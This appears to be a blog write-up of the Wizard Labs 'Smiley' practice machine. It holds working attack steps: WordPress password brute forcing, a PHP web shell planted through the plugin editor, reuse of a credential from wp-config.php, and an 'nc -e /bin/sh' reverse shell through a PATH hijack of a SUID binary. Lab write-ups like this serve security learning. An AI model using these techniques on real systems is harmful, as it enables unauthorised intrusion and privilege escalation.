---
layout: post
title: Wizard Labs - Smiley
date: 2019-04-26 12:22
author: rowbot
comments: true
categories: [SUID, Wizard Labs, Wordpress]
---
<!-- wp:image {"id":814,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-37.png" alt="" class="wp-image-814"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Even though the difficulty of this machine was 3/10 it took me quite a while to complete it. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":815,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-38.png" alt="" class="wp-image-815"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>nmap scan reveals a wordpress site running on port 80.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":816,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-39.png" alt="" class="wp-image-816"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After a lot of directory searching turned up with nothing. I only had a username - smiley. </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I forgot about the brute force method. You can use WPScan to brute force</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">⚡  ~/Desktop/smiley <br>cat username  <br>smiley <br>wpscan --url http://10.1.1.42/ -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt -U username  </pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>Password found - music</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":818,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-40.png" alt="" class="wp-image-818"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>That took me the guts of 5 hours to get that far. I've made a mental note not to forget about brute forcing when nothing else turns up.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":819,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-41.png" alt="" class="wp-image-819"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I went to Plugins and Editor and added php code to index.php to see if I can get command execution </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":820,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?fit=680%2C104" alt="" class="wp-image-820"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p> &lt;?php echo shell_exec($_GET['cmd']); ?&gt; </p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>I activated the Hello Dolly plugin and refreshed the index page. I always view the source when I do this as it makes the output readable. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":821,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-43.png" alt="" class="wp-image-821"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Otherwise it will look like this</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":822,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-44.png" alt="" class="wp-image-822"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So I can get command execution. Now to get a nc reverse shell.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":823,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-45.png" alt="" class="wp-image-823"/></figure></div>
<!-- /wp:image -->

<!-- wp:image {"id":824,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-46.png" alt="" class="wp-image-824"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>So I'm in as www-data but obviously can't view user.txt as I'm not user mike</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>cd /home
$ ls
ls
mike
$ cd mike
cd mike
/bin/sh: 5: cd: can't cd to mike
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>As the server is running wordpress I knew there would be a password stored in wp-config.php</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wpdatabase');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'Il0veW0rdpress');

/** MySQL hostname */
define('DB_HOST', 'localhost');
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I'll try to ssh using it and user mike and Il0veW0rdpress as the password  </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":826,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-47.png" alt="" class="wp-image-826"/></figure></div>
<!-- /wp:image -->

<!-- wp:html -->
<pre>mike@smiley:~$ cat user.txt 
b075f6e221bbe611fafa9b7ae3688379
mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I noticed that there is a file with SUID bit set in mike's home directory</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>mike@smiley:~$ ls -la listwww 
-rwsr-xr-x 1 root root 7332 Dec 27 06:03 listwww
mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>When I run it it lists the contents of /var/www/html</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>mike@smiley:~$ ./listwww 
index.php    readme.html  suid.c	   wp-admin	       wp-comments-post.php  wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
license.txt  suid	  wp-activate.php  wp-blog-header.php  wp-config-sample.php  wp-content     wp-includes  wp-load.php	    wp-mail.php   wp-signup.php    xmlrpc.php
listing /var/www/html mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>Doing strings listwww reveals </p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>UWVS
[^_]
listing /var/www/html 
sleep 3
/bin/ls /var/www/html
;*2$"
GCC: (Debian 7.3.0-11) 7.3.0
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I opened the file in Ghidra and it decompiled the binary to reveal in main</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":833,"align":"center"} -->
<div class="wp-block-image"><figure class="aligncenter"><img src="http://offsecnewbie.com/wp-content/uploads/2019/04/image-48.png" alt="" class="wp-image-833"/></figure></div>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>It looks like it says "listing /var/www/html" then sleeps for 3 seconds then does an ls on that directory. So I need to get this binary to run code which will give me root shell. Looking at the strings again I knew that as the ls command has a fully qualified path /bin/ls I could not take advantage of this. The sleep command however wasn't fully qualified - it had just sleep. If it was it would have read /usr/bin/sleep.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>So in order to run this I needed to change the PATH to /home/mike and put a sleep script in there which the listwww would hopefully run.</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>mike@smiley:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:html -->
<pre>mike@smiley:~$ export PATH=/home/mike/:$PATH
mike@smiley:~$ echo $PATH
/home/mike/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>I added a nc reverse shell to sleep. Ran the listwww binary again..</p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre>mike@smiley:~$ cat sleep 
nc -e /bin/sh 10.253.0.255 443
mike@smiley:~$ 
</pre>
<!-- /wp:html -->

<!-- wp:paragraph -->
<p>and got a connection back! </p>
<!-- /wp:paragraph -->

<!-- wp:html -->
<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/smiley </font></span><font color="#3465A4"></font> <font color="#4E9A06">nc</font> -lnvp 443
listening on [any] 443 ...
connect to [10.253.0.255] from (UNKNOWN) [10.1.1.42] 40548
id
uid=0(root) gid=1000(mike) groups=1000(mike)
cat /root/root.txt
a16c33fc59fe0a3deecf6212b60f2b9b
</pre>
<!-- /wp:html -->
